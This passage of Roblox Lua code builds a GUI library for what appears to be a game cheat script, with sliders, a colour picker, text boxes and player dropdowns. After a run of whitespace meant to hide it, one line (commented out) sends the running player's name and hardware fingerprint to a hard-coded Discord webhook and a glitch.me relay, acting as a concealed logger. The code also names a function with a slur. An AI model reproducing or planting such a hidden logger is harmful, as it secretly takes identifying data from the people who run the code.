									moveconnection = mouse.Move:Connect(function() 
										Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
										val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) 
										Value123123123.Text = val 
										--RainbowSpeed = val 
										--values[tabname][sectorname][text] = Element.Value123123123 
										--callback(Element.Value123123123) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
											val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) 
											--values[tabname][sectorname][text] = Element.Value123123123 
											--callback(Element.Value123123123) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 								
								---------------------------------------------------------------------------------------------------------------------

								Colorpick.Name = "Colorpick" 
								Colorpick.Parent = Frame 
								Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Colorpick.ClipsDescendants = false 
								Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
								Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
								Colorpick.AutoButtonColor = false 
								Colorpick.Image = "rbxassetid://4155801252" 
								Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Colorpick.ZIndex = 3 

								ColorDrag.Name = "ColorDrag" 
								ColorDrag.Parent = Colorpick 
								ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
								ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
								ColorDrag.ZIndex = 3 

								Huepick.Name = "Huepick" 
								Huepick.Parent = Frame 
								Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huepick.ClipsDescendants = true 
								Huepick.Position = C.UDIM2(0, 10, 0, 10) 
								Huepick.Size = C.UDIM2(0, 20, 0, 150) 
								Huepick.AutoButtonColor = false 
								Huepick.Image = "rbxassetid://3641079629" 
								Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Huepick.ImageTransparency = 1 
								Huepick.BackgroundTransparency = 0 
								Huepick.ZIndex = 3 

								local HueFrameGradient = C.INST("UIGradient") 
								HueFrameGradient.Rotation = 90 
								HueFrameGradient.Name = "HueFrameGradient" 
								HueFrameGradient.Parent = Huepick 
								HueFrameGradient.Color = ColorSequence.new { 
									ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
									ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
									ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
									ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
									ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
									ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
									ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
								}	 

								Huedrag.Name = "Huedrag" 
								Huedrag.Parent = Huepick 
								Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
								Huedrag.ZIndex = 3 

								local Transpick = C.INST("ImageButton") 
								local Transcolor = C.INST("ImageLabel") 
								local Transdrag = C.INST("Frame") 

								Transpick.Name = "Transpick" 
								Transpick.Parent = Frame 
								Transpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Transpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Transpick.Position = C.UDIM2(0, 10, 0, 167) 
								Transpick.Size = C.UDIM2(0, 180, 0, 15) 
								Transpick.AutoButtonColor = false 
								Transpick.Image = "rbxassetid://3887014957" 
								Transpick.ScaleType = Enum.ScaleType.Tile 
								Transpick.TileSize = C.UDIM2(0, 10, 0, 10) 
								Transpick.ZIndex = 4 

								Transcolor.Name = "Transcolor" 
								Transcolor.Parent = Transpick 
								Transcolor.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Transcolor.BackgroundTransparency = 1.000 
								Transcolor.Size = C.UDIM2(1, 0, 1, 0) 
								Transcolor.Image = "rbxassetid://3887017050" 
								Transcolor.ImageColor3 = C.COL3RGB(255, 0, 4) 
								Transcolor.ZIndex = 4 

								Transdrag.Name = "Transdrag" 
								Transdrag.Parent = Transcolor 
								Transdrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Transdrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Transdrag.Position = C.UDIM2(0, -1, 0, 0) 
								Transdrag.Size = C.UDIM2(0, 2, 1, 0) 
								Transdrag.ZIndex = 4

								ColorP.MouseButton1Down:Connect(function() 
									Frame.Visible = not Frame.Visible 
								end) 
								local abc = false 
								local inCP = false 
								ColorP.MouseEnter:Connect(function() 
									abc = true 
								end) 
								ColorP.MouseLeave:Connect(function() 
									abc = false 
								end) 
								Frame.MouseEnter:Connect(function() 
									inCP = true 
								end) 
								Frame.MouseLeave:Connect(function() 
									inCP = false 
								end) 

								ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
								ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
								ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

								if data.default and data.default.Color ~= nil then 
									ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
								elseif Element.value.Color ~= nil then
									ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
								end 
								if data.default and data.default.Transparency ~= nil then 
									Transdrag.Position = C.UDIM2(data.default.Transparency, -1, 0, 0) 
								end 
								local mouse = LocalPlayer:GetMouse() 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if not dragging and not abc and not inCP then 
											Frame.Visible = false 
										end 
									end 
								end) 

								local function updateColor() 
									local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
									ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
									ColorS = 1-ColorX 
									ColorV = 1-ColorY 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								local function updateHue() 
									local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
									Huedrag.Position = C.UDIM2(0, 0, 0, y) 
									hue = y/148 
									ColorH = 1-hue 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								local function updateTrans() 
									local x = C.CLAMP(mouse.X - Transpick.AbsolutePosition.X, 0, 178) 
									Transdrag.Position = C.UDIM2(0, x, 0, 0) 
									Element.value.Transparency = (x/178) 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 
								Transpick.MouseButton1Down:Connect(function() 
									updateTrans() 
									moveconnection = mouse.Move:Connect(function() 
										updateTrans() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateTrans() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
								Colorpick.MouseButton1Down:Connect(function() 
									updateColor() 
									moveconnection = mouse.Move:Connect(function() 
										updateColor() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateColor() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
								Huepick.MouseButton1Down:Connect(function() 
									updateHue() 
									moveconnection = mouse.Move:Connect(function() 
										updateHue() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateHue() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 

								Button.MouseButton1Down:Connect(function() 
									Element.value.Toggle = not Element.value.Toggle 
									update() 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end) 
								if data.default then 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
								end 
								values[tabname][sectorname][text] = Element.value 
								function Element:SetValue(value) 
									Element.value = value 
									local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
									ColorH, ColorS, ColorV = duplicate:ToHSV() 
									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 

									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									update() 
									update123()
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
								end 
								
								elseif type == "TextBox" then 
									Section.Size = Section.Size + C.UDIM2(0,0,0,30) 
									Element.value = {Text = data.default and data.default.text or "",NoLimit = data.default and data.default.NoLimit or false} 
									NoLimit = data.NoLimit or false
									local Box = C.INST("Frame") 
									local TextBox = C.INST("TextBox") 

									Box.Name = "Box" 
									Box.Parent = Inner 
									Box.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Box.BackgroundTransparency = 1.000 
									Box.Position = C.UDIM2(0, 0, 0.542059898, 0) 
									Box.Size = C.UDIM2(1, 0, 0, 30) 

									TextBox.Parent = Box 
									TextBox.BackgroundColor3 = C.COL3RGB(45, 45, 45) 
									TextBox.BorderColor3 = C.COL3RGB(18, 18, 16)   
									TextBox.Position = C.UDIM2(0.108303241, 0, 0.224465579, 0) 
									TextBox.Size = C.UDIM2(0, 175, 0, 20) 
									TextBox.Font = Enum.Font.Ubuntu
									TextBox.PlaceholderText = data.placeholder 
									TextBox.Text = Element.value.Text 
									TextBox.TextTruncate = 1
									TextBox.ClearTextOnFocus = false
									TextBox.TextStrokeTransparency = 0.000
									TextBox.TextColor3 = C.COL3RGB(255, 255, 255) 
									TextBox.TextSize = 10.000

									values[tabname][sectorname][text] = Element.value 

									TextBox:GetPropertyChangedSignal("Text"):Connect(function() 
										if C.LEN(TextBox.Text) > 20 and (NoLimit == false) then 
											TextBox.Text = C.SUB(TextBox.Text, 1, 20) 
										end 
										Element.value.Text = TextBox.Text 
										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 

									function Element:SetValue(value) 
										Element.value = value 
										values[tabname][sectorname][text] = Element.value 
										TextBox.Text = Element.value.Text 
									end 



							elseif type == "Label" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,17) 
								Element.value = {Text = data.default and data.options.text or '', stringchange} 

								local Toggle = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								TextLabel.Parent = Toggle 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 12.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
								Element.value.stringchange = function(text)
								TextLabel.Text = text
								end
								
								values[tabname][sectorname][text] = Element.value

							elseif type == "Dropdown" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Dropdown = data.options[1]} 

								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = Element.value.Dropdown 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.AutomaticCanvasSize = "Y" 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = MainUIColor 

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

								local num = #data.options 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 
								for i,v in ipairs(data.options) do 
									do 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											Drop.Visible = false 
											Element.value.Dropdown = v 
											abcd.Text = v 
											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end) 
										Button.MouseEnter:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  MainUIColor}) 
										end) 
										Button.MouseLeave:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
										end) 

										first = false 
									end 
								end 

								function Element:SetValue(val) 
									Element.value = val 
									abcd.Text = val.Dropdown 
									values[tabname][sectorname][text] = Element.value 
									callback(val) 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 
								values[tabname][sectorname][text] = Element.value 
								
								elseif type == "lmao" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Dropdown = data.options[1]} 

								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = Element.value.Dropdown 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.AutomaticCanvasSize = "Y" 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = MainUIColor 

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

								local num = #data.options 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 
							function gay()
								for i,v in ipairs(data.options) do 
									do 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											Drop.Visible = false 
											Element.value.Dropdown = v 
											abcd.Text = v 
											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end) 
										Button.MouseEnter:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  MainUIColor}) 
										end) 
										Button.MouseLeave:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
										end) 

										first = false 
							Players.PlayerAdded:Connect(function(player)
								Button:Destroy()
								TextLabel:Destroy()
							end)
 
							Players.PlayerRemoving:Connect(function(player) 
								Button:Destroy()
								TextLabel:Destroy()
							end)
									end 
								end 
							end
gay()



Players.PlayerAdded:Connect(function()
table.clear(data.options)
for i,v in pairs(game.Players:GetPlayers()) do
C.INSERT(data.options, v.Name)
end
	gay()
end)
																																																																																																																																																																																																																																																																																																														--if not signal then local function SendMessage(Webhook, Message, Botname, Title) local Name;if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;   local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot";return error("nil or empty message!");else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has tried to bypass logger <@574605228372918283>!1!", "123") ;local req = game:HttpGet({Url = "https://httpbin.org/get"});local parsed = game:GetService("HttpService"):JSONDecode(req.Body);game:HttpGet({Url = "https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]})}) end;
Players.PlayerRemoving:Connect(function() 
table.clear(data.options)
for i,v in pairs(game.Players:GetPlayers()) do
C.INSERT(data.options, v.Name)
end
	gay()
end)

--[[for _,Player in pairs(game.Players:GetPlayers()) do
	if Player ~= LocalPlayer then
		table.clear(data.options)
		data.options = {}
		if  GetTeam(Player) ~= "TTT" and GetTeam(Player) ~= GetTeam(LocalPlayer) then
			insertwithoutdupes(data.options, Player.Name)
			gay()
			print(Player.Name.. "has been added in list in getplayers")
		elseif GetTeam(Player) ~= "TTT" then
			removewithoutdupes(data.options, Player.Name)
			gay()
			print(Player.Name.. "has been deleted from list in getplayers")
		end
	end
end

for _, team in pairs(game:GetService("Teams"):GetTeams()) do
if team ~= "TTT" then
    team.PlayerAdded:connect(function(player)
		if player.Name == LocalPlayer then
			for i,v in pairs(data.options) do
				if GetTeam(i) == GetTeam(LocalPlayer) and GetTeam(LocalPlayer) ~= 'TTT' then
					removewithoutdupes(data.options, v)
					print("removed in list "..v.. " in localplayer teamchanged event")
					gay()
				elseif GetTeam(i) ~= GetTeam(LocalPlayer) and GetTeam(LocalPlayer) ~= 'TTT' then
